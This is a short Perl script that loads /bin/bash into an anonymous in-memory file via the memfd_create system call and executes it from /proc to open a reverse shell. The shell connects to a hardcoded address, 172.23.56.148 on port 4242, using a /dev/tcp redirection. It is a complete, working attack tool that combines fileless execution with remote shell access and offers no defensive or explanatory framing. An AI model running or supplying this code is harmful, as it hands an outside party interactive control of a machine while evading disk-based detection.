#!/usr/bin/perl
use strict;
use warnings;

# Constants
my $sys_memfd_create = 319;  # System call number for memfd_create on x86_64
my $MFD_CLOEXEC = 1;         # Constant for MFD_CLOEXEC

# Create an in-memory file
my $name = "";
my $fd = syscall($sys_memfd_create, $name, $MFD_CLOEXEC);
die "memfd_create failed: $!" if $fd == -1;

# Open the file descriptor as a file handle
open(my $FH, '>&='.$fd) or die "open: $!";
select((select($FH), $|=1)[0]);

# Write the reverse shell ELF binary to the in-memory file
my $elf_binary = "/bin/bash";  # Use /bin/bash for the reverse shell
open(my $bin, '<', $elf_binary) or die "Cannot open binary file: $!";
binmode($bin);
while (read($bin, my $chunk, 4096)) {
    print $FH $chunk;
}
close($bin);

# Execute the reverse shell from memory
exec {"/proc/$$/fd/$fd"} "bash", "-c", 'bash -i >& /dev/tcp/172.23.56.148/4242 0>&1' or die "exec failed: $!";

